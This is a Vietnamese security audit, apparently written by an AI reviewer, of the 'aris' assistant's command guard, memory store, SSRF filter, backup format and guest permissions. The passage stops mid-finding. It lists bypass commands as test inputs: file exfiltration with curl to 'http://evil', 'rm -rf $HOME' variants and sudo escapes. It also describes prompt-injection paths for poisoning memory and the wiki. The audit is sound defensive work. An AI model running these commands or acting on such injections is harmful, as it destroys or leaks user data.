# Rà soát bảo mật aris, đợt 7f phần A

Người rà: Sonnet 5.5, theo `docs/plans/gd7-7f-ra-soat-bao-mat.md`. Chỉ đọc mã và gọi hàm với đầu vào giả. Không sửa mã, không commit, không đổi cài đặt, không dùng mạng. Opus cần xác minh các phát hiện Nặng và Vừa trước khi sửa.

Môi trường rà: daemon `vn.aris.daemon` đang chạy (pid 2033, dsh 0.2.1-rc.2), web `127.0.0.1:3201`, `DSH_HOME` là `.dsh-home` của worktree này. Chế độ duyệt hiện tại là `ask` (không phải `auto`). ACP đang bật, mở cho hai bot.

## 1. Tóm tắt

| Mức | Số | Mã |
| --- | --- | --- |
| Nặng | 1 | S1 (có điều kiện: chỉ khi người dùng bật "Tự cho việc rủi ro thấp"; hiện đang tắt) |
| Vừa | 10 | S2 đến S11 |
| Nhẹ | 9 | S12 đến S20 |

Không tìm thấy khoá API, token Telegram hay mật khẩu lọt ra tệp, log, tài liệu, lịch sử git hay tham số tiến trình.

Điểm tốt đã kiểm:

- Web chỉ nghe `127.0.0.1:3201`. dsh có hàng rào Host, Origin, `Sec-Fetch-Site` và cookie `HttpOnly; SameSite=Strict` cho mọi route `/api/*`, kể cả `/api/aris/*`. Trang web lạ không gọi được POST đổi trạng thái.
- Mọi socket (`acp.sock`, `run/*.sock`) nằm trong `~/.aris` (0700) và có quyền 0600 (hoặc thư mục cha 0700).
- Keychain: giá trị khoá đi qua stdin dạng hex, không nằm trong tham số tiến trình.
- Mã hoá sao lưu đúng chuẩn: AES-256-GCM, IV 12 byte ngẫu nhiên, muối 16 byte riêng mỗi tệp, mã khôi phục 120 bit.
- Thẻ duyệt Telegram (`ap:`, `ax:`, `sx:`, `bn:`) kiểm đúng người bấm là chủ nhân.

Ba việc nên làm trước: S1 (hàng rào "tự cho"), S5 và S6 (đường tiêm nội dung vào ký ức và bộ não), S4 (token trong log).

## 2. Bảng phát hiện

| Mã | Mức | Nơi | Tóm tắt |
| --- | --- | --- | --- |
| S1 | Nặng (có điều kiện) | `aris-guard/src/policy.ts:106-120` | `lowRisk` tự cho lệnh nối bằng `&` hay xuống dòng, và nhiều lệnh "chỉ đọc" thực ra ghi hoặc chạy lệnh |
| S2 | Vừa | `aris-guard/src/policy.ts:31-90` | `hardVerdict` bỏ lọt nhiều dạng xoá, push đè, nâng quyền |
| S3 | Vừa | `aris-guard/src/policy.ts:19-28, 77-86` | Đường dẫn khoá bị lách; danh sách thiếu nhiều nơi chứa bí mật |
| S4 | Vừa | dsh `web-app` `printUrl`; `~/Library/Logs/aris/daemon.log` | Token đăng nhập web sống tới khi daemon khởi động lại, ghi vào log, bot đọc được |
| S5 | Vừa | `aris-memory/src/index.ts:239-262`, `store.ts:274-290` | Model tự khai `origin=user` là ký ức lõi có hiệu lực ngay; `update`, `forget` không kiểm gì |
| S6 | Vừa | `aris-brain/src/index.ts:794-830`, `ingest.ts:111` | `brain_note` không cần duyệt, nhật ký được tự nạp vào wiki |
| S7 | Vừa | `aris-brain/src/extract.ts:18-26, 86-92` | `safeUrl` lọt IPv6, 172.16/12, 100.64/10; theo chuyển hướng không kiểm lại (SSRF) |
| S8 | Vừa | `aris-backup/src/archive.ts:129`, `restore.ts:63-73` | Đầu tệp sao lưu không được xác thực; `aris restore` tin `id` và `root` trong đó |
| S9 | Vừa | `aris-channels/src/hub.ts:798-802` | Quyền hạn chế của thành viên và khách Telegram chỉ là một câu dặn trong prompt |
| S10 | Vừa | `aris-skills/src/eval.ts:63-92` | Hộp cát kiểm thử skill có cùng lỗ hổng như S1 |
| S11 | Vừa | `aris-acp/src/index.ts:286-295`, `policy.ts:58-166` | Ứng dụng khách tự khai `cwd`; bộ quyền khách không chặn ghi ngoài thư mục qua shell |
| S12 | Nhẹ | cookie `dsh-auth-*` | Cookie dùng chung mọi cổng của `127.0.0.1`, sống 30 ngày, không thu hồi được |
| S13 | Nhẹ | `~/aris/{brain,workspace,projects}` | Quyền 755, thư mục nhà 750 nhóm `staff`: người dùng khác trên máy đọc được |
| S14 | Nhẹ | mọi handler `/api/aris/*` | Không bắt `content-type: application/json` |
| S15 | Nhẹ | `aris-keychain/src/keychain.ts` | Mục Keychain tạo bằng `security`: tiến trình nào của cùng user cũng đọc được; hàng rào chỉ là regex |
| S16 | Nhẹ | `aris-brain/src/git.ts:17-31` | `git` chạy trong kho bộ não, nghe theo `.git/config` của kho |
| S17 | Nhẹ | `aris-backup/src/archive.ts:30-52, 195-215` | Đầu tệp lộ tên máy, đường dẫn; giải mã chảy thẳng vào `tar` trước khi xác thực thẻ |
| S18 | Nhẹ | `aris-channels/src/store.ts:166-172` | Bảng `strangers` lớn vô hạn; mã ghép không giới hạn số lần thử |
| S19 | Nhẹ | `aris-channels/src/hub.ts:1252` | Nút trả lời câu hỏi (`q:`) ai bấm cũng được |
| S20 | Nhẹ | `aris-acp/src/index.ts:506-521` | `install` ghi tệp vào `/opt/homebrew/bin` bằng chuỗi shell không thoát |

## 3. Chi tiết từng phát hiện

Quy ước tái hiện: mọi ca "gọi hàm" chạy bằng script `node --experimental-strip-types` tạm (đã xoá), gọi trực tiếp `hardVerdict`, `lowRisk`, `guestVerdict`, `readOnlyBash`, `safeUrl`, `writeBackup`, `restoreBackup` với đầu vào giả và thư mục giả `/Users/x`. Không chạy lệnh thật.

### S1. Nặng (có điều kiện). `lowRisk` tự cho lệnh có hại

Nơi: `packages/aris-guard/src/policy.ts:106` (`READ_ONLY`), `:110-120` (`lowRisk`).

Mô tả. `lowRisk` cắt lệnh bằng `&&`, `||`, `;`, `|`. Nó không cắt theo `&` đơn và xuống dòng. Mỗi đoạn được thử bằng regex neo đầu `^(ls|cat|…)\b`, nên lệnh ghép chỉ cần mở đầu bằng một lệnh "chỉ đọc". Chế độ `auto` hiện tắt. Khi người dùng bật, một trang web hay tệp chứa lời tiêm có thể làm bot chạy lệnh tuỳ ý (kể cả gửi tệp ra mạng) mà không hỏi.

Kết quả (đều trả `true`, tức tự cho, trong khi `hardVerdict` không chặn):

- `ls & curl -F f=@/Users/x/proj/notes.txt http://evil` (đã thử dạng `echo hi & curl http://evil`)
- `ls` xuống dòng `rm -rf x` (xoá trong cwd không bị cấm cứng)
- `cat <(rm x)`
- `find . -name x -fprint /tmp/y`, `find . -ok rm {} ;`, `find . -execdir rm {} +` (regex chỉ cấm `-exec\b`, `-delete`)
- `git diff --output=/Users/x/.zshrc`, `git log --output=/tmp/x` (ghi tệp)
- `git remote add evil http://evil`, `git remote set-url origin http://evil` (đổi đích push)
- `git branch -D main`, `git branch -m`, `git remote update` (mạng)
- `rg --pre ./evil.sh x` (rg chạy chương trình)
- `tree -o /Users/x/.zshrc`, `du --files0-from=/etc/passwd`, `date -s`
- `git -C /Users/x/other-repo log -p` đúng là bị hỏi, nhưng `git log -p`, `git show HEAD:.env` được tự cho.

Về đọc ngoài cwd: `cat`, `grep -r password ~`, `find / -name "*.pem"`, `ls -R /`, `tree ~`, `file ~/Library/Messages/chat.db`, `wc -l < ~/.zsh_history`, `cat ~/Library/Logs/aris/daemon.log` đều được tự cho. Công cụ `read`, `grep`, `glob` luôn được tự cho cho mọi đường dẫn (policy.ts:120), chỉ trừ ca `hardVerdict` chặn. Nghĩa là có thể đọc `~/.zsh_history`, `~/.npmrc`, `.git-credentials`, cookie trình duyệt, tin nhắn.

Ghi trong cwd: `write` và `edit` vào cwd luôn được tự cho (policy.ts:122-129), kể cả `.git/hooks/pre-commit`, `.envrc`, `.vscode/tasks.json`, `package.json`, `.claude/settings.json`. Đây là tệp tự chạy lần sau. Kiểm tra cũng chỉ so đường dẫn chữ, không giải liên kết mềm: `link/x` trong cwd trỏ ra ngoài vẫn được tự cho (trong `~/aris/workspace` và `~/aris/projects` hiện chưa có liên kết mềm).

Đề xuất sửa:

1. Đổi `lowRisk` từ danh sách cho phép theo regex sang bộ tách lệnh đúng: từ chối mọi lệnh có `&`, xuống dòng, `<(`, `>(`, `\r`. Trong `lowRisk` (dòng 113): thêm `|[&\n\r]|<\(` vào regex đang chặn.
2. Bỏ `find` khỏi `READ_ONLY`, hay chỉ cho `find` khi không có `-fprint*`, `-fls`, `-ok*`, `-exec*`, `-delete`. Cho `git` chỉ các lệnh con an toàn kèm cấm `--output`, `-c`, `--ext-diff`, `--open-files-in-pager`; bỏ `branch`, `remote` (hay chỉ cho `git branch --list`, `git remote -v`). Bỏ `tree`, `du`, `file`, `stat` nếu nhắm ra ngoài cwd. Thêm cờ cấm `--pre`, `--output`, `-o`.
3. Đọc ngoài cwd: tự cho `read`, `grep`, `glob`, `cat`… chỉ khi đường dẫn nằm trong cwd (dùng `insideDir`), trừ khi người dùng thêm thư mục tin cậy. Đường dẫn ngoài cwd thì hỏi.
4. Giải liên kết mềm (`realpath`) trước `insideDir` cho ghi và đọc.
5. Ghi trong cwd: không tự cho `.git/**`, `.envrc`, `.vscode/**`, `.claude/**`, `package.json`, `Makefile`, `*.plist`, tệp có bit chạy.
6. Thêm test từ danh sách trên vào `guard.test.ts`.

### S2. Vừa. `hardVerdict` bỏ lọt nhiều lệnh nguy hiểm

Nơi: `packages/aris-guard/src/policy.ts:31-43` (`rmTargets`), `:56-90` (`hardVerdict`).

Mô tả. Hàm đọc chữ thô của lệnh, nên các dạng đổi cách viết đều lọt. Dưới đây là kết quả từng ca (cwd giả `/Users/x/proj`, home giả `/Users/x`).

Bị chặn đúng: `rm -rf ~/`, `rm -r -f /Users/x`, `rm -fr /Users/x/Documents`, `rm -rf ../`, `rm --recursive --force ~/Documents`, `rm -R ~`, `command rm -rf ~`, `env rm -rf ~`, `nohup rm -rf ~`, `if …; then rm -rf ~; fi`, xuống dòng rồi `rm -rf ~`, `cd ~ && rm -rf *`, `terminal_send` với `rm -rf ~`, `git push -f`, `git push --force-with-lease`, `sudo ls`, `env sudo ls`, `security find-generic-password` (kể cả `/usr/bin/security`, hai dấu cách), `security dump-keychain`, `security export`.

Lọt:

- Biến shell: `rm -rf "$HOME"`, `rm -rf ${HOME}`, `rm -rf $HOME/Documents`, `rm -rf "$HOME"/Documents`, `rm -rf $(echo ~)`, `rm -rf $PWD/..`. Nguyên nhân: `insideDir` chỉ thay `~` đầu chuỗi, còn `$HOME` bị coi là tên thư mục con của cwd, nên "nằm trong cwd".
- Đường lệnh khác: `/bin/rm -rf ~`, `\rm -rf ~`, `"rm" -rf ~`, `(rm -rf ~)`, `rm -rf ~root`.
- Glob: `rm -rf .*` (khớp `..`).
- Đổi thư mục trước: `cd ~ && rm -rf Documents`, `cd ~; rm -rf .` (cwd của hàm không đổi theo `cd`).
- Bao lệnh: `bash -c "rm -rf ~"`, `sh -c '…'`, `eval "rm -rf ~"`, `xargs rm -rf`, `python3 -c "…shutil.rmtree('/Users/x')"`, `perl -e …`, `node -e "fs.rmSync(…)"`.
- Công cụ khác: `find ~ -delete`, `find . -delete`, `find ~/Documents -exec rm -rf {} +`, `shred -u`, `mv ~/Documents /dev/null`, `rsync -a --delete`, `git clean -fdx`, `git reset --hard HEAD~5`, `diskutil eraseDisk`, `dd of=/dev/disk2`, `chmod -R 777 ~`, PowerShell `Remove-Item -Recurse -Force ~`.
- Push đè dạng khác: `git push origin +main`, `git -c x=y push --force` (regex đòi `git` sát `push`), `git push origin :main`, `git push origin --delete main`, `git push --mirror`.
- Nâng quyền: `doas`, `su -c`, `osascript -e 'do shell script "…" with administrator privileges'`, `SUDO ls`, `\sudo`, `s\udo`, `"sudo"`.
- Keychain: `echo "find-generic-password -s x -w" | security -i` (chế độ tương tác), `security find-identity`.
- Dừng aris: `launchctl unload|bootout …vn.aris.daemon`.

Đề xuất sửa:

1. Chuẩn hoá lệnh trước khi so: bỏ dấu `\`, `"`, `'` bao từ đầu lệnh; thay `$HOME`, `${HOME}`, `"$HOME"` bằng home thật; lấy `basename` của lệnh (để `/bin/rm`, `\rm` thành `rm`).
2. Tách lệnh bằng bộ phân tích thật (hay ít nhất cắt cả `&`, `(`, `)`, xuống dòng, `$(`, backtick) và bóc `bash|sh|zsh -c '…'`, `eval`, `xargs`, `env`, `command`, `nohup`, `time`, `exec`, `sudo` rồi kiểm lại phần bên trong.
3. Theo dõi `cd`: đoạn sau `cd X` tính đường tương đối từ X. Nếu `cd` đi ra ngoài cwd thì coi cwd là X.
4. Cấm thêm: `find … -delete|-exec rm`, `rsync --delete`, `shred`, `git clean -f`, `git reset --hard`, `dd of=`, `diskutil (erase|partition)`, `launchctl (unload|bootout|remove|kill)` nhắm `vn.aris`, `doas`, `su`, `osascript … administrator`, `security -i`, `security (add|delete)-…`, `git push` có `+ref`, `:ref`, `--delete`, `--mirror`, `-c … push`.
5. `rm -rf .*` và mọi glob bắt đầu bằng `.`: coi là xoá ngoài cwd.
6. Với script `python -c`, `perl -e`, `node -e`, `ruby -e`: không chặn cứng được, nhưng thêm vào danh sách "luôn hỏi, không bao giờ tự cho" và ghi rõ trong bản vẽ 6.4 là hàng rào không chặn tuyệt đối.

### S3. Vừa. Đường dẫn khoá bị lách và danh sách thiếu

Nơi: `packages/aris-guard/src/policy.ts:19-28` (`protectedPath`), `:77-86`; `packages/aris-acp/src/policy.ts:71-100` (`secretPath`, `shellTouchesSecret`).

Bị chặn đúng: `cat ~/.ssh/id_rsa`, `cat $HOME/.ssh/id_rsa`, `cat ${HOME}/.ssh/id_rsa`, `cat ~/.ssh/../.ssh/id_rsa`, `cp ~/.ssh/id_ed25519 /tmp/x`, `base64 < ~/.aws/credentials`, `cat ~/.ssh/*`, `cat ~/.ssh/config`, `cat ~/Library/Keychains/…`, `read .env`, `read ../.env`, `read .env.local`, `read .env.production`, `read ~/.netrc`, `read ~/.config/gh/hosts.yml`, `read` tệp trong `.dsh-home`, `write ~/.aris/x`, `curl -F f=@~/.ssh/id_rsa`, `ln -s ~/.ssh k && cat k/id_rsa`. (Một số ca chặn nhờ tên `id_rsa`, không nhờ thư mục.)

Lọt:

- `cat "$HOME"/.ssh/config` (dấu nháy cắt chuỗi `$HOME/`)
- `cd ~; cat .ssh/config`, `cd; cat .ssh/config` (đường tương đối tính từ cwd cũ)
- `cat ~/.s*/config`, `d=.ssh; cat ~/$d/config` (glob, biến)
- `cat .e*`, `cat .en?` (glob khớp `.env`)
- `git show HEAD:.env`, `grep -r KEY .` (đọc `.env` trong cwd)
- Liên kết mềm thật: tệp `proj/link -> ../home/.ssh`, gọi `hardVerdict('read', {file_path:'link/config'})` trả "không chặn" (đối chứng `.ssh/config` thẳng thì chặn). Hàm chỉ dùng `path.resolve`, không `realpath`.
- `glob` với `pattern` tuyệt đối (`/Users/x/.ssh/*`): chỉ kiểm `path`, bỏ qua `pattern`. Chỉ lộ tên tệp.
- `grep` có tham số `glob` kiểu `.ssh/*`.

Danh sách thiếu (đọc/ghi được, không bị chặn): `~/.npmrc` (ở danh sách khách có, ở danh sách cứng không), `~/.git-credentials`, `~/.docker/config.json`, `~/.kube/config`, `~/.config/gcloud`, `~/.zsh_history`, `~/.bash_history`, `~/Library/Messages`, cookie và `Login Data` của trình duyệt, `~/Library/Logs/aris/daemon.log` (có token đăng nhập, xem S4), `aris-keychain.json`, `~/Library/Application Support/aris*`, `*.pem`, `*.p12`, `*.key`, `secrets.json`, `credentials.json`.

Tự khởi chạy khi đăng nhập (câu hỏi trong plan "có nên cấm?"): có. `write ~/.zshrc`, `~/.zprofile`, `~/Library/LaunchAgents/*.plist`, `/etc/hosts` đều lọt; `echo … >> ~/.zshrc`, `tee ~/Library/LaunchAgents/evil.plist`, `cp evil.plist ~/Library/LaunchAgents/`, `launchctl load …`, `crontab`, `sed -i … ~/.zshrc` cũng lọt. Nên cấm cứng ghi vào `~/.zshrc|.zprofile|.zshenv|.bashrc|.bash_profile|.profile`, `~/Library/LaunchAgents`, `/Library/Launch*`, `/etc`, `~/.claude`, `~/.config/fish`, `~/.ssh` (ghi `authorized_keys` đã bị chặn nhờ `.ssh`).

Đề xuất sửa: gộp hai danh sách (`protectedPath` và `secretPath`) thành một module chung trong `@aris/guard`. Mở rộng như trên. Chuẩn hoá lệnh trước khi duyệt token (S2.1). Gọi `realpath` (có catch khi tệp chưa tồn tại: `realpath` thư mục cha) rồi so lại. Với `glob`/`grep`, kiểm cả `pattern` và `glob`. Với đường tương đối sau `cd` xem S2.3. Với glob trong lệnh shell: nếu token có `*?[` và phần cố định trỏ vào thư mục chứa bí mật thì chặn.

### S4. Vừa. Token đăng nhập web sống lâu, nằm trong log, bot đọc được

Nơi: `node_modules/.pnpm/@deepseek-ai+dsh-web-app@0.2.1-rc.2_*/…/lib/index.js:32,162` (`printUrl` mặc định `true`); `…/dsh-client-connection/lib/index.js:412-422, 462-500` (`BrowserAuth`); `~/Library/Logs/aris/daemon.log`; `.dsh-home/web.log`; `packages/aris-guard/src/policy.ts` (không chặn đọc log).

Kết quả kiểm:

- Token (`processLaunchToken`) là 32 byte ngẫu nhiên sinh một lần cho mỗi tiến trình, không hết hạn trong đời tiến trình, đổi khi khởi động lại. Daemon chạy lâu (launchd `KeepAlive`), nên token sống nhiều ngày.
- Token chỉ có trong URL `http://127.0.0.1:3201/?token=…`. dsh in ra stdout, launchd ghi vào `daemon.log`. Tìm thấy 242 dòng `token=` (mỗi lần khởi động lại một dòng; chỉ dòng cuối còn sống). `daemon.log` có quyền 644, không xoay vòng, nằm trong `~/Library/Logs` (0700) nên chỉ cùng user đọc được. `.dsh-home/web.log` (644, trong thư mục 0700) còn một URL token cũ đã chết.
- Đổi token lấy cookie 30 ngày. Cookie ký bằng bí mật bền (trong kho khoá của dsh), không có chỗ thu hồi từng cookie.
- Hàng rào của aris không chặn bot đọc log: `hardVerdict('bash', 'cat ~/Library/Logs/aris/daemon.log')` và `read ~/Library/Logs/aris/daemon.log` đều không chặn; `lowRisk` còn tự cho `cat`, `grep token …/daemon.log` ở chế độ `auto`. Lệnh `aris url` và `node scripts/aris.mjs url` cũng lọt, trong khi lệnh đó in URL đăng nhập. Bot lấy được token (nghĩa là token vào ngữ cảnh gửi tới DeepSeek) có thể đăng nhập web với quyền chủ nhân, rồi đổi `mode` thành `auto` ở `/api/aris/guard`, đổi `set-dir` sao lưu, bật ACP… (mỗi lệnh `curl` phải qua duyệt ở chế độ `ask`, nhưng người dùng khó thấy ý đồ).

Đề xuất sửa:

1. Đặt `printUrl: false` cho plugin `web-app` trong `packages/aris-web-bundle/cordis.patch.yml` (dsh có sẵn cờ). Người dùng lấy URL bằng `aris url`, vốn đi qua socket 0600.
2. Thêm vào `protectedPath` (S3): `Library/Logs/aris`, `.aris`, và chặn lệnh `aris url|stop|restart|send|ask` và `scripts/aris.mjs` trong `hardVerdict` (ngoài người dùng gõ tay).
3. Xoay vòng `daemon.log` (newsyslog hay cắt khi khởi động) và xoá dòng `token=` cũ; xoá `.dsh-home/web.log`.
4. Làm cho cookie thu hồi được: nút "Đăng xuất mọi nơi" xoá bản ghi `client-connection:browser-session` để đổi bí mật ký. (Việc này nằm ở dsh; chờ bản dsh sau.)

### S5. Vừa. Ký ức: `origin` do model tự khai

Nơi: `packages/aris-memory/src/index.ts:239-262` (`case 'save'`), `:262-272` (`update`, `forget`); `packages/aris-memory/src/store.ts:274-290`.

Mô tả. Chỉ ký ức `origin=user` có hiệu lực ngay và vào lõi. Nhưng `origin` là tham số của lời gọi công cụ do chính model điền. Model đã đọc trang web hay email chứa lời tiêm có thể gọi `memory {action:'save', origin:'user', tier:'core', text:'…'}`. `store.save` chỉ cấm `tier=core` khi `trust==='external'`, mà `trust` lại suy từ `origin` do model khai. Hệ quả: ký ức lõi bị đầu độc ngay, nạp vào mọi lượt của mọi phiên sau (dùng cho cả bot khác qua `book=owner`).

Thêm: `action=update` (store.ts:274) và `forget` (:283) không kiểm gì về nguồn. Model bị tiêm có thể sửa chữ của ký ức lõi đang có (không qua `propose`) hay xoá ký ức. Công cụ `memory` không yêu cầu duyệt (không có `ask` nào trong aris cho công cụ này; mặc định của dsh là `allow`).

Với Telegram: lượt của thành viên và khách (S9) cũng gọi được công cụ này.

Đề xuất sửa:

1. Không tin `origin=user` từ model. Cách tối thiểu: chỉ cho `origin=user` khi lượt hiện tại đến từ tin của người dùng chính và chưa có kết quả công cụ nguồn ngoài (`web_fetch`, `web_search`, `read` ngoài cwd, email, ACP, `brain_read`…) trong lượt đó. Theo dõi bằng cờ "lượt đã đọc nguồn ngoài" gắn khi `tools/post-execute` của các công cụ đó; cờ bật thì ép `origin=external`.
2. Lượt không phải của chủ nhân (Telegram thành viên/khách, ACP khách): ép mọi `save` thành đề xuất chờ duyệt, cấm `update`, `forget`.
3. `update` trên ký ức đang hiệu lực phải đi qua `proposals` (đề xuất sửa kèm diff) khi cờ ở mục 1 bật.
4. Ghi vào `MEMORY_OP_RECORD` kèm id lượt và cờ nguồn ngoài để truy vết.

### S6. Vừa. `brain_note` và tự nạp nhật ký

Nơi: `packages/aris-brain/src/index.ts:794-830` (`brain_note`); `packages/aris-brain/src/ingest.ts:111` ("Tự nạp: nhật ký, ghi nhanh… Có ⚠ thì không bao giờ tự nạp"); `pipeline.ts:857-894` (tự nạp nhật ký cuối ngày); `pipeline.ts:636-675` (`brain_capture`).

Mô tả. `brain_note` ghi thẳng vào nhật ký hôm nay, không cần duyệt, không ghi nguồn. Lúc 23:00 Thủ thư (một lượt model) tự nạp nhật ký vào các trang wiki khi không có cờ ⚠. Nội dung do model bị tiêm viết thành "sự thật" và về sau mọi bot tìm thấy qua `brain_search`. Cờ ⚠ do chính model Thủ thư đặt, nên lời tiêm cũng có thể khuyên nó đừng đặt. `brain_capture` (bot gửi nguồn) đúng là chờ duyệt, nên tốt hơn.

Đề xuất sửa: gắn nguồn cho mỗi dòng nhật ký (`bot`, id phiên, `ngoai`/`chu`) và dùng chung cờ "lượt đã đọc nguồn ngoài" của S5. Dòng nhật ký có cờ ngoài, hay do lượt không phải của chủ nhân, thì không bao giờ tự nạp; luôn vào hàng "duyệt nhanh". Giới hạn số dòng `brain_note` mỗi phiên mỗi ngày.

### S7. Vừa. SSRF khi bot gửi link vào bộ não

Nơi: `packages/aris-brain/src/extract.ts:18-26` (`safeUrl`), `:86-92` (`fetchPage`, `redirect: 'follow'`); gọi ở `pipeline.ts:355`; tới từ `brain_capture {link}` (không cần duyệt trước khi tải) và từ người dùng.

Kết quả gọi `safeUrl` (trả "cho tải" nghĩa là lọt):

- Chặn đúng: `127.0.0.1`, `localhost`, `localhost.`, `2130706433`, `0x7f.1`, `0.0.0.0`, `192.168.x`, `10.x`, `169.254.x`, `file:`.
- Lọt: `http://[::ffff:127.0.0.1]/` (URL chuẩn hoá thành `[::ffff:7f00:1]`), `http://[::]/`, `http://172.16.0.1/` và `172.20.10.1` (vùng điện thoại phát wifi), `http://100.64.1.1/` (Tailscale/CGNAT), `http://[fd00::1]/`, `http://[fe80::1]/`, `http://metadata.google.internal/`.
- Không kiểm tên miền trỏ về IP nội bộ (DNS), và `redirect: 'follow'` theo mọi chuyển hướng không kiểm lại. Một trang công khai trả 302 tới `http://127.0.0.1:3201/…` hay `http://127.0.0.1:3100/` là qua.

Hệ quả: nội dung dịch vụ nội bộ (router, dịch vụ dev trên máy, NAS) bị tải, lưu vào Hộp thư vào, đưa cho Thủ thư (model) và hiện trong bộ não. `web_fetch` của dsh thì đã chống tốt (kiểm lại mỗi chuyển hướng, ghim DNS).

Đề xuất sửa: dùng chung cách chống của dsh `web-fetch-http`, hay viết lại `safeUrl` + `fetchPage`: phân giải DNS, từ chối mọi IP không phải `public` (loopback, private, link-local, CGNAT, ULA, IPv4-mapped, unspecified); đặt `redirect: 'manual'` và kiểm lại từng chặng (tối đa 3); chỉ cho cổng 80/443. Có thể dùng `ipaddr.js` (dsh đã dùng).

### S8. Vừa. Tệp sao lưu: đầu tệp không được xác thực

Nơi: `packages/aris-backup/src/archive.ts:129` (`createCipheriv` không `setAAD`), `:167-185` (`readHeader`); `packages/aris-backup/src/restore.ts:63-73`.

Mô tả. Thẻ GCM chỉ phủ phần tar mã hoá. JSON đầu tệp (gồm `parts[].id`, `root`, `entries`) nằm ngoài. `restoreBackup` dùng `header.parts[0].root` làm nơi tạo thư mục tạm khi không có `roots.dsh`, và `join(tmp, p.id)`, `roots[p.id] ?? p.root` cho từng phần. Kẻ có quyền ghi vào thư mục sao lưu (ví dụ thư mục đồng bộ iCloud, Dropbox, ổ ngoài) chỉ cần sửa đầu tệp, không cần biết mã, rồi chờ người dùng chạy `aris restore`.

Tái hiện (thư mục tạm, mã tạm; kết quả thật):

- Sửa đầu tệp xong, `extractBackup` vẫn báo hợp lệ ("tag hợp lệ dù đầu tệp đã sửa").
- Đổi `root` của phần đã biết, gọi `restoreBackup(file, code, {})` không truyền `roots`: dữ liệu rơi vào đường dẫn kẻ tấn công chọn. (`aris restore` luôn truyền `roots` cho các id đã biết, nên ca này không trúng lệnh thật.)
- Thêm một phần có `id: ".."`, `root: <đích>`, và `parts[0].root` trỏ vào thư mục sao lưu: `src = join(tmp, "..")` là chính thư mục sao lưu. `restoreBackup` chuyển toàn bộ nội dung thư mục đó (gồm tệp kẻ tấn công cài sẵn, ví dụ `evil.plist`) vào `<đích>`. Trong thử nghiệm, `ke-tan-cong.plist` cùng mọi bản sao lưu khác đã được dời vào "LaunchAgents" giả. Với `aris restore` thật, `parts[0].root` lấy từ `roots.dsh` cục bộ nên thư mục tạm nằm cạnh `.dsh-home`; kẻ tấn công vẫn chọn được `p.id` kiểu `../../x` và `p.root` tuỳ ý để dời thư mục có thật của người dùng sang chỗ khác, nhưng không cài được nội dung riêng của mình trừ khi trúng thư mục họ ghi được.

Mức: cần đồng thời (a) quyền ghi thư mục sao lưu, (b) người dùng chạy `aris restore` (biết mã). Hậu quả: dời hay ghi đè thư mục tuỳ ý của người dùng; có thể thành chạy mã nếu đích là nơi tự khởi chạy và kẻ tấn công cài được tệp vào thư mục chứa tệp sao lưu.

Đề xuất sửa:

1. Đưa đầu tệp vào AAD: `cipher.setAAD(Buffer.concat([MAGIC, len, head]))` khi ghi, `decipher.setAAD(...)` khi đọc (đổi `v` lên 2, vẫn đọc được `v1` có cảnh báo).
2. Kiểm hợp lệ đầu tệp: `p.id` phải khớp `^[a-z]{2,12}$` và thuộc danh sách `partSpecs()`. Bỏ qua phần không biết. `root` chỉ lấy từ `roots`, không lấy từ đầu tệp (nếu thiếu thì báo lỗi).
3. Trong `restoreBackup`, `join(tmp, p.id)` phải được kiểm `relative(tmp, src)` không bắt đầu bằng `..`. Thư mục tạm luôn đặt ở `roots.dsh`, không bao giờ từ đầu tệp.

### S9. Vừa. Hạn chế quyền khách Telegram chỉ là lời dặn

Nơi: `packages/aris-channels/src/hub.ts:798-802` (câu `(Người này không phải người dùng chính: …)`), `:1934` (`approve` từ chối khi không phải chủ nhân); `packages/aris-channels/src/access.ts:116-138`.

Mô tả. Người lạ nhắn riêng thì im lặng và báo chủ nhân. Nhóm lạ chỉ trả lời khi `guestMode` bật và bot được @ đích danh (hiện tắt). Thành viên (qua nút "Cho phép hỏi đáp", hay nhóm `who: everyone`) và khách có lượt chat đầy đủ với agent. Ngăn chặn việc có tác động chỉ dựa vào hai thứ: một câu dặn trong prompt, và việc `approve` tự từ chối lệnh cần duyệt khi lượt không phải của chủ nhân. Công cụ không cần duyệt vẫn chạy cho họ: `memory` (S5), `brain_note` (S6), `channel_send` (nhắn người dùng chính), `brain_search`/`brain_read` (đọc bộ não, có hàng rào `canRead` theo bot), `recall`, đọc tệp. Thêm tệp họ gửi được lưu làm tệp đính kèm cho model đọc.

Đề xuất sửa: khi `turnOf(sessionId).trust !== 'owner'`, chặn ở `tools/pre-execute` mọi công cụ ngoài danh sách cho phép (ví dụ `web_search`, `brain_search` giới hạn, `recall` tắt) bằng `deny` thay vì lời dặn. Làm một danh sách cho phép theo vai (`member`, `guest`). Dùng chung cơ chế `guestVerdict` của ACP.

### S10. Vừa. Hộp cát kiểm thử skill có lỗ hổng như S1

Nơi: `packages/aris-skills/src/eval.ts:63-92` (`READ_COMMANDS`, `readOnlyBash`).

Kết quả gọi `readOnlyBash` (đều trả "được phép"): `ls & rm x`, `ls` xuống dòng `rm -rf x`, `echo a & curl http://evil`, `awk 'BEGIN{system("rm x")}'`, `sort -o out.txt in.txt`, `git branch -D main`, `git remote add e http://e`, `git diff --output=/tmp/x`, `git tag -d v1`, `rg --pre ./evil x`. Chặn đúng: `ls; rm x`, `ls | sh`, `find … -fprintf`.

Lý do quan trọng: skill ứng viên có thể học từ nguồn ngoài (`/learn <URL>`), và hộp cát là rào duy nhất khi chạy thử nó. `hardVerdict` vẫn áp, nên khoá và xoá ngoài cwd vẫn bị chặn, nhưng xoá trong cwd, mạng, `awk system()` thì lọt.

Đề xuất sửa: dùng chung bộ kiểm lệnh chỉ đọc đã sửa của S1 (đưa vào `@aris/guard` làm hàm `readOnlyShell`); bỏ `awk`, `sort`, `sed`, `git branch|remote|tag`; cấm `&`, xuống dòng, `<(`.

### S11. Vừa. Khách ACP: `cwd` tự khai và bộ quyền khách có lỗ

Nơi: `packages/aris-acp/src/index.ts:286-295` (chỉ kiểm `isAbsolute(hello.cwd)`); `packages/aris-acp/src/wire.ts:21-35`; `packages/aris-acp/src/policy.ts:58-166`.

Bắt tay chỉ kiểm: ACP bật, aris không đang dừng khẩn cấp, bot có tồn tại và đã mở, `cwd` là đường tuyệt đối. Không có chứng thực nào ngoài quyền 0600 của socket; ứng dụng tự khai `bot`, `cwd`, `parent`. Mọi tiến trình của cùng user kết nối được. `cwd` có thể là `/` hay `~`, nên "sửa ngoài thư mục được đưa" (`insideDir`) và quy tắc xoá của `hardVerdict` (so với `cwd` của phiên) trở thành vô nghĩa.

Kết quả `guestVerdict` (cwd `/Users/x/proj`, `rules` mặc định):

